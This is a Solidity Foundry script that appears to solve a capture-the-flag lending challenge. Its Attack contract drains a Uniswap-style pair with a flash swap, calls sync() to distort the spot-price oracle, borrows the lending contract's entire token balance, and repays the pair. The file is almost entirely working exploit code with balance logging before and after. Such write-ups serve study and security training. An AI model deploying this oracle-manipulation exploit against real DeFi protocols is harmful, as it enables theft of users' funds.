// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Pair, Lending, ERC20} from "../src/Lending.sol";

contract LendingSolve is Script {
    Lending public lending = Lending(0x8a8D8670bF4d33D00790c40bfeAF79296C266BA2);
    Pair public pair = lending.pair();
    ERC20 public collateralToken = lending.collateralToken();
    ERC20 public borrowToken = lending.borrowToken();
    address player = vm.envAddress("PLAYER");

    // // Deploy
    // function setUp() external{
    //     lending = new Lending();
    //     vm.deal(player, 1 ether);
    // }
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Lending : ", address(lending));
        console.log("Pair : ", address(pair));
        console.log("token0 (or) collateralToken  : ", pair.token0());
        console.log("token1 (or) borrowToken:  ", pair.token1());
        
        console.log("Pair balance of collatoralToken : ", collateralToken.balanceOf(address(pair)));
        console.log("Pair balance of borrowToken : ", borrowToken.balanceOf(address(pair)));
        (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) = pair.getReserves();
        console.log("Pair reserve0 : ", _reserve0);
        console.log("Pair reserve1 : ", _reserve1);

        console.log("Lending balance of collatoralToken : ", collateralToken.balanceOf(address(lending)));
        console.log("Lending balance of borrowToken : ", borrowToken.balanceOf(address(lending)));

        console.log("Player balance of collatoralToken : ", collateralToken.balanceOf(address(player)));
        console.log("Player balance of borrowToken : ", borrowToken.balanceOf(address(player)));

        console.log("price of borrowToken in terms of collatoralTokens : ", lending.getExchangeRate());
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);

        Attack attack = new Attack(address(lending), player);
        attack.exploit();

        console.log("Pair balance of collatoralToken : ", collateralToken.balanceOf(address(pair)));
        console.log("Pair balance of borrowToken : ", borrowToken.balanceOf(address(pair)));

        console.log("Lending balance of collatoralToken : ", collateralToken.balanceOf(address(lending)));
        console.log("Lending balance of borrowToken : ", borrowToken.balanceOf(address(lending)));

        console.log("Player balance of collatoralToken : ", collateralToken.balanceOf(address(player)));
        console.log("Player balance of borrowToken : ", borrowToken.balanceOf(address(player)));
        console.log("isSolved() : ", lending.isSolved());
        vm.stopBroadcast();
    }
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract Attack is IUniswapV2Callee {
    Lending public lending;
    Pair public pair;
    ERC20 public collateralToken;
    ERC20 public borrowToken;
    address player;

    constructor(address _lending, address _player) {
        lending = Lending(_lending);
        pair =  lending.pair();
        collateralToken = lending.collateralToken();
        borrowToken = lending.borrowToken();
        player = _player;
    }
    function exploit() public {
        uint256 totalBorrowableBorrowTokenFromPair = borrowToken.balanceOf(address(pair)) - 1;
        pair.swap(0, totalBorrowableBorrowTokenFromPair, address(this), abi.encodePacked("something"));
    }
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
        uint256 totalBorrowableBorrowTokenFromLending = borrowToken.balanceOf(address(lending));
        pair.sync();
        lending.borrow(totalBorrowableBorrowTokenFromLending);
        uint256 borrowedTokensFromLending = borrowToken.balanceOf(address(address(this)));
        borrowToken.transfer(address(pair), borrowedTokensFromLending);
    }
}